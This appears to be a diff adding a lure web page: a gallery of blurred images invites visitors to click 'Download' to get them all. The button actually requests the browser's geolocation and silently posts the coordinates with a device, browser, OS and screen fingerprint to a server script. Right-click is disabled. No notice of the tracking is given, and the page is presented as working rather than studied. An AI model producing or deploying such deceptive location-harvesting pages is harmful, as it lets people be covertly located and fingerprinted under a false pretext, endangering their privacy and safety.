@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Image Gallery</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        background-image: url('https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse3.mm.bing.net%2Fth%3Fid%3DOIP.ZoTY4c5chhjg9Nxv00XF0AAAAA%26pid%3DApi&f=1&ipt=6405e46cded9145f7eadfa4c764cbb64c57681bc278875b0a5c24f319e16a27e&ipo=images');
+        background-size: cover;
+        background-position: center;
+    }
+
+    #outerContainer {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    #main {
+        max-width: 80%;
+        text-align: center;
+        background-color: rgba(255, 255, 255, 0.7);
+        padding: 20px;
+        border-radius: 10px;
+    }
+
+    #message {
+        margin-bottom: 20px;
+    }
+
+    .imageContainer {
+        text-align: center;
+        margin-bottom: 20px;
+        width: 20%;
+        float: left;
+        box-sizing: border-box;
+        padding: 0 5px;
+        overflow: hidden;
+        height: 250px;
+    }
+
+    .imageContainer img {
+        max-width: 100%;
+        height: auto;
+    }
+
+    @media only screen and (max-width: 600px) {
+        .imageContainer {
+            width: 50%;
+        }
+    }
+
+    #getLocation {
+        background-color: rgb(254, 150, 167);
+        color: white;
+        border: none;
+        border-radius: 20px;
+        padding: 10px 20px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+    }
+
+    #getLocation:hover {
+        background-color: #ff80bf;
+    }
+
+</style>
+</head>
+<body oncontextmenu="return false">
+    <div id="outerContainer">
+        <div id="main">
+            <div id="message">
+                <p>You want to download all these images, just click the download button below.</p>
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_90c2fb76-bf4f-48c2-bafe-74957e931e91.jpg" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_ea32b722-23bd-4ae4-8acc-0ccba23d9be7.jpg" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_c7893c0a-1dba-409d-82c6-754b2ea02e53.jpg" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_7fcea43a-58e8-4c7e-b523-c9945ea63f67.png" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_dfed4fd3-ab1d-46af-9b83-2dd3adcd109d.jpg" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/blur/blur_5f0ed6cd-af5a-43c6-9b2f-fc937a138708.png" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_1582813e-89e0-4b09-a10b-53ec9590a8ab.png" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_cf90353e-85af-4b14-b193-916c86514f43.jpg" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_a9296d3c-3ce2-4e94-ac24-2de8f77fe754.jpg" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_1582813e-89e0-4b09-a10b-53ec9590a8ab.png" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/blur/blur_a37186cc-a1f8-427a-8da6-e84170e02d0b.png" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_0744f8f8-55b1-41bb-b507-0f0a3e09f6db.png" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_f96ad9db-30ac-4e47-ba83-a38e5f068fde.jpg" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/blur/blur_44466bc0-f6bd-402a-8239-9fe60a0905d3.png" alt="Image 1">
+            </div>
+            <div class="imageContainer">
+                <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/blur/blur_ac3ae054-f384-4939-9c34-44532995a716.png" alt="Image 1">
+            </div>
+            <div id="button">
+                <button id="getLocation" class="jfk-button jfk-button-action">Download</button>
+            </div>
+        </div>
+    </div>
+
+<script>
+    function detectDevice() {
+        var userAgent = navigator.userAgent.toLowerCase();
+
+        if (userAgent.includes("mobile")) {
+            return "Smartphone";
+        } else if (userAgent.includes("tablet")) {
+            return "Tablet";
+        } else {
+            return "Desktop";
+        }
+    }
+
+    function detectBrowser() {
+        var userAgent = navigator.userAgent.toLowerCase();
+
+        if (userAgent.includes("chrome")) {
+            return "Chrome";
+        } else if (userAgent.includes("firefox")) {
+            return "Firefox";
+        } else if (userAgent.includes("safari")) {
+            return "Safari";
+        } else if (userAgent.includes("edge")) {
+            return "Edge";
+        } else if (userAgent.includes("opera")) {
+            return "Opera";
+        } else {
+            return "Unknown";
+        }
+    }
+
+    function getOperatingSystem() {
+        var userAgent = navigator.userAgent;
+        var os;
+
+        if (userAgent.indexOf("Win") != -1) {
+            os = "Windows";
+        } else if (userAgent.indexOf("Mac") != -1) {
+            os = "Macintosh";
+        } else if (userAgent.indexOf("Linux") != -1) {
+            os = "Linux";
+        } else if (userAgent.indexOf("Android") != -1) {
+            os = "Android";
+        } else if (userAgent.indexOf("iOS") != -1) {
+            os = "iOS";
+        } else {
+            os = "Other";
+        }
+
+        return os;
+    }
+
+    function getScreenResolution() {
+        return window.innerWidth + "x" + window.innerHeight;
+    }
+
+    document.getElementById("getLocation").addEventListener("click", getLocation);
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, showError);
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    }
+
+    function sendLocation(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const deviceType = detectDevice();
+        const browserName = detectBrowser();
+        const os = getOperatingSystem();
+        const screenResolution = getScreenResolution();
+
+        fetch("store_location.php", {
+            method: "POST",
+            body: JSON.stringify({ latitude, longitude, deviceType, browserName, os, screenResolution, userAgent: navigator.userAgent }),
+            headers: {
+                "Content-Type": "application/json",
+            },
+        })
+        .then(response => response.text())
+        .then(data => {
+
+        })
+        .catch(error => {
+        });
+    }
+
+    function showError(error) {
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                alert("User denied the request for Geolocation.");
+                break;
+            case error.POSITION_UNAVAILABLE:
+                alert("Location information is unavailable.");
+                break;
+            case error.TIMEOUT:
+                alert("The request to get user location timed out.");
+                break;
+            case error.UNKNOWN_ERROR:
+                alert("An unknown error occurred.");
+                break;
+        }
+    }
+</script>
+
+</body>
+</html>
